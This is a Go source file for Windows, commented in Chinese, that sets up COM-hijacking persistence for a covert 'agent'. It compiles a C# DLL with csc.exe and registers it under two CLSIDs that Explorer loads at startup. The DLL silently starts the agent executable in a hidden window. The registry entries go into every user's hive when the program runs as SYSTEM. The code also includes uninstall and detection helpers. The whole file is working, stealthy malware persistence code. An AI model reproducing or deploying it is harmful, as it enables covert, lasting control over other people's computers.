//go:build windows

package main

import (
	"crypto/sha256"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

// ═══ COM 劫持持久化 ═══
// 替代计划任务（消除闪烁），利用 Explorer.exe 启动时加载的 COM 对象
// 在 HKCU 下注册优先级更高的 InprocServer32，指向我们的 .NET DLL
// Explorer 加载 COM 对象时 → mscoree.dll 加载我们的 DLL → 静态构造函数启动 agent

// 劫持目标 CLSID（Explorer 每次启动都会加载这些 COM 对象）
var comHijackTargets = []string{
	`{42aedc87-2188-41fd-b9a3-0c966feab5f3}`, // MruPidlList — Explorer shell 启动必加载
	`{fbeb8a05-beee-4442-804e-409d6c4515e9}`, // Shell ImageList helper
}

// generateComGUID 基于机器 ID 生成确定性 GUID（每台机器不同）
func generateComGUID(salt string) string {
	mid, _ := getMachineID()
	if mid == "" {
		mid = "fallback-id"
	}
	h := sha256.Sum256([]byte(mid + "|comguid|" + salt))
	return fmt.Sprintf("{%08x-%04x-%04x-%04x-%012x}",
		uint32(h[0])<<24|uint32(h[1])<<16|uint32(h[2])<<8|uint32(h[3]),
		uint16(h[4])<<8|uint16(h[5]),
		uint16(h[6])<<8|uint16(h[7]),
		uint16(h[8])<<8|uint16(h[9]),
		uint64(h[10])<<40|uint64(h[11])<<32|uint64(h[12])<<24|uint64(h[13])<<16|uint64(h[14])<<8|uint64(h[15]))
}

// buildComDllSource 生成 COM 代理 DLL 的 C# 源码
// DLL 加载时检测 Mutex → agent 未运行则启动 agent.exe
func buildComDllSource() string {
	mutexName := getAgentMutexName()
	exePath := sid().ExePath
	// 转义路径中的反斜杠
	escapedPath := strings.ReplaceAll(exePath, `\`, `\\`)

	return fmt.Sprintf(`using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;

[assembly: System.Reflection.AssemblyTitle("%s")]
[assembly: System.Reflection.AssemblyVersion("1.0.0.0")]

[ComVisible(true)]
[Guid("%s")]
public class %s
{
    static %s()
    {
        try
        {
            Mutex m = null;
            try { m = Mutex.OpenExisting("%s"); } catch {}
            if (m != null) { m.Close(); return; }
            string exe = "%s";
            if (File.Exists(exe))
            {
                ProcessStartInfo psi = new ProcessStartInfo(exe);
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
            }
        }
        catch {}
    }
}
`, sid().ComAsmName,
		strings.Trim(generateComGUID("class"), "{}"),
		sid().ComClass,
		sid().ComClass,
		mutexName,
		escapedPath)
}

// compileComDll 使用 csc.exe 编译 COM 代理 DLL
func compileComDll() error {
	csSource := buildComDllSource()
	csPath := filepath.Join(sid().Dir, "_tmp.cs")
	dllPath := sid().ComDllPath

	// 写入源码
	if err := os.WriteFile(csPath, []byte(csSource), 0644); err != nil {
		return fmt.Errorf("write cs source: %v", err)
	}
	defer os.Remove(csPath)

	// 查找 csc.exe（.NET Framework 4.0 始终存在于 Windows 7+）
	cscPaths := []string{
		`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`,
		`C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe`,
	}
	var cscExe string
	for _, p := range cscPaths {
		if _, err := os.Stat(p); err == nil {
			cscExe = p
			break
		}
	}
	if cscExe == "" {
		return fmt.Errorf("csc.exe not found")
	}

	// 编译为 DLL
	cmd := exec.Command(cscExe,
		"/target:library",
		"/optimize+",
		"/nologo",
		"/out:"+dllPath,
		"/reference:System.dll",
		csPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("csc compile: %v: %s", err, string(out))
	}
	return nil
}

// getUserSIDs 枚举所有真实用户的 SID（跳过系统账户）
// 用于在 SYSTEM 身份下写入每个用户的 HKU\{SID}\... 注册表
func getUserSIDs() []string {
	var sids []string
	profilePath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList`
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, profilePath, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		return sids
	}
	defer k.Close()
	names, _ := k.ReadSubKeyNames(-1)
	for _, name := range names {
		// 跳过短 SID（系统内置账户如 S-1-5-18、S-1-5-19、S-1-5-20）
		if len(name) < 20 {
			continue
		}
		sids = append(sids, name)
	}
	return sids
}

// writeCOMRegForKey 向指定注册表根键写入 COM 劫持注册表项
func writeCOMRegForKey(rootKey registry.Key, clsid string) {
	keyPath := `Software\Classes\CLSID\` + clsid + `\InprocServer32`
	k, _, err := registry.CreateKey(rootKey, keyPath, registry.SET_VALUE)
	if err != nil {
		return
	}
	k.SetStringValue("", "mscoree.dll")
	k.SetStringValue("ThreadingModel", "Both")
	k.SetStringValue("Class", sid().ComClass)
	k.SetStringValue("Assembly", sid().ComAsmName+", Version=1.0.0.0, Culture=neutral, PublicKeyToken=null")
	k.SetStringValue("CodeBase", "file:///"+strings.ReplaceAll(sid().ComDllPath, `\`, `/`))
	k.SetStringValue("RuntimeVersion", "v4.0.30319")
	k.Close()
}

// installCOMHijack 安装 COM 劫持持久化
// 写入所有用户的 HKU\{SID}（解决 SYSTEM 身份下 HKCU 无效的问题）
func installCOMHijack() error {
	// 1. 编译 COM 代理 DLL（仅在不存在时编译）
	if _, err := os.Stat(sid().ComDllPath); err != nil {
		if err := compileComDll(); err != nil {
			return fmt.Errorf("[COM DLL 编译] %v", err)
		}
	}

	// 2. 写入当前用户 HKCU（适用于以普通用户身份运行时）
	for _, clsid := range comHijackTargets {
		writeCOMRegForKey(registry.CURRENT_USER, clsid)
	}

	// 3. 枚举所有用户 SID，写入 HKU\{SID}（适用于以 SYSTEM 身份运行时）
	for _, userSID := range getUserSIDs() {
		hkuKey, err := registry.OpenKey(registry.USERS, userSID, registry.SET_VALUE|registry.CREATE_SUB_KEY)
		if err != nil {
			continue
		}
		for _, clsid := range comHijackTargets {
			keyPath := `Software\Classes\CLSID\` + clsid + `\InprocServer32`
			subKey, _, err := registry.CreateKey(hkuKey, keyPath, registry.SET_VALUE)
			if err != nil {
				continue
			}
			subKey.SetStringValue("", "mscoree.dll")
			subKey.SetStringValue("ThreadingModel", "Both")
			subKey.SetStringValue("Class", sid().ComClass)
			subKey.SetStringValue("Assembly", sid().ComAsmName+", Version=1.0.0.0, Culture=neutral, PublicKeyToken=null")
			subKey.SetStringValue("CodeBase", "file:///"+strings.ReplaceAll(sid().ComDllPath, `\`, `/`))
			subKey.SetStringValue("RuntimeVersion", "v4.0.30319")
			subKey.Close()
		}
		hkuKey.Close()
	}

	return nil
}

// uninstallCOMHijack 移除 COM 劫持持久化（HKCU + 所有用户 HKU）
func uninstallCOMHijack() {
	for _, clsid := range comHijackTargets {
		keyPath := `Software\Classes\CLSID\` + clsid
		registry.DeleteKey(registry.CURRENT_USER, keyPath+`\InprocServer32`)
		registry.DeleteKey(registry.CURRENT_USER, keyPath)
	}
	// 同时清理所有用户 HKU
	for _, userSID := range getUserSIDs() {
		for _, clsid := range comHijackTargets {
			keyPath := userSID + `\Software\Classes\CLSID\` + clsid
			registry.DeleteKey(registry.USERS, keyPath+`\InprocServer32`)
			registry.DeleteKey(registry.USERS, keyPath)
		}
	}
	os.Remove(sid().ComDllPath)
}

// isCOMHijackInstalled 检测 COM 劫持是否已安装（检查 HKCU + 所有用户 HKU）
func isCOMHijackInstalled() bool {
	if len(comHijackTargets) == 0 {
		return false
	}
	// 先检查 HKCU
	if checkCOMReg(registry.CURRENT_USER, `Software\Classes\CLSID\`+comHijackTargets[0]+`\InprocServer32`) {
		return true
	}
	// 再检查任意用户 HKU
	for _, userSID := range getUserSIDs() {
		keyPath := userSID + `\Software\Classes\CLSID\` + comHijackTargets[0] + `\InprocServer32`
		if checkCOMReg(registry.USERS, keyPath) {
			return true
		}
	}
	return false
}

func checkCOMReg(root registry.Key, keyPath string) bool {
	k, err := registry.OpenKey(root, keyPath, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()
	val, _, err := k.GetStringValue("CodeBase")
	if err != nil {
		return false
	}
	return strings.Contains(val, sid().ComDllName)
}
